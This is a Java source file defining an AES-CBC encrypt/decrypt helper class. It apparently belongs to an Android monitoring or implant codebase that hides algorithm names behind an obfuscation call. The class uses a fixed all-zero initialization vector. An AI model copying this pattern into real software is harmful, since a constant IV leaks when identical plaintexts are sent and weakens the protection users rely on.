package com.android.dvci.crypto;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.android.dvci.action.sync.Statistics;
import com.android.dvci.auto.Cfg;
import com.android.mm.M;

public class CryptoCBC {

	private Cipher cipherEnc;
	private Cipher cipherDec;
	private byte[] aes_key;
	private SecretKeySpec skey_spec;
	private IvParameterSpec ivSpec;

	public CryptoCBC(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		aes_key = new byte[key.length];
		System.arraycopy(key, 0, aes_key, 0, key.length);
		// 17.0=AES
		skey_spec = new SecretKeySpec(aes_key, M.e("AES")); //$NON-NLS-1$

		final byte[] iv = new byte[16];

		for (int i = 0; i < 16; i++) {
			iv[i] = 0;
		}

		ivSpec = new IvParameterSpec(iv);

		cipherEnc = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding"));
		cipherEnc.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
		cipherDec = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding"));
		cipherDec.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);

	}

	/**
	 * Encrypt.
	 * 
	 * @param clear
	 *            the clear
	 * @return the byte[]
	 * @throws InvalidAlgorithmParameterException
	 * @throws InvalidKeyException
	 * @throws BadPaddingException
	 * @throws IllegalBlockSizeException
	 * @throws Exception
	 *             the exception
	 */
	public byte[] encrypt(final byte[] clear) throws InvalidKeyException, InvalidAlgorithmParameterException,
			IllegalBlockSizeException, BadPaddingException {
		
		Statistics stats;
		if(Cfg.STATISTICS){
			stats=new Statistics("Encrypt",clear.length);
		}
		final byte[] encrypted = cipherEnc.doFinal(clear);
		if(Cfg.STATISTICS){
			stats.stop();
		}
		return encrypted;
	}

	/**
	 * Decrypt.
	 * 
	 * @param encrypted
	 *            the encrypted
	 * @return the byte[]
	 * @throws Exception
	 *             the exception
	 */
	public byte[] decrypt(final byte[] encrypted, int offset, long length) throws Exception {
		
		final byte[] decrypted = cipherDec.doFinal(encrypted,offset,(int) length);
		return decrypted;
	}
}
